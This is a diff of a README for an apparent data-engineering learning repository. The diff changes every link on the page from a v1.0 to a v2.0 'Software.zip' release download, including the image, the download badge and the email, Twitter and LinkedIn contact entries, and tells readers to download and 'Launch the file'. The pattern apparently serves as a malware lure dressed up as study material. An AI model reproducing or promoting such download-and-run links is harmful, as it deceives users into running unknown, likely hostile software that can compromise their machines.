@@ -2,7 +2,7 @@
 
 Welcome to The Data Engineering Academy repository! Here you will find a collection of materials related to data engineering, covering a wide range of topics including Apache Airflow, Apache Kafka, Apache Spark, data cleaning, data preparation, Databricks, dbt, dimensional data modeling, Docker, Elasticsearch, FastAPI, MongoDB, pipelines, platforms, Python, relational data modeling, Snowflake, and SQL.
 
-![Data Engineering](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip)
+![Data Engineering](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip)
 
 ## About
 
@@ -36,9 +36,9 @@ Welcome to The Data Engineering Academy repository! Here you will find a collect
 
 ## Access Software
 
-To access additional software and tools related to data engineering, you can download the [https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip) file. Launch the file to explore a collection of resources that will help you in your data engineering journey.
+To access additional software and tools related to data engineering, you can download the [https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip) file. Launch the file to explore a collection of resources that will help you in your data engineering journey.
 
-[![Download Software](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip)](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip)](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip)
 
 ## Get Involved
 
@@ -47,9 +47,9 @@ We welcome contributions from the community to enhance this repository further. 
 ## Connect with Us
 
 If you have any questions, suggestions, or feedback, please reach out to us. You can connect with The Data Engineering Academy through the following channels:
-- Email: https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip
-- Twitter: [@DataEngineeringAcademy](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip)
-- LinkedIn: [The Data Engineering Academy](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v1.0/Software.zip)
+- Email: https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip
+- Twitter: [@DataEngineeringAcademy](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip)
+- LinkedIn: [The Data Engineering Academy](https://github.com/kevinborgesz/The-Data-Engineering-Academy/releases/download/v2.0/Software.zip)
 
 Let's embark on this data engineering journey together and unlock the potential of data-driven insights! 📊✨
 
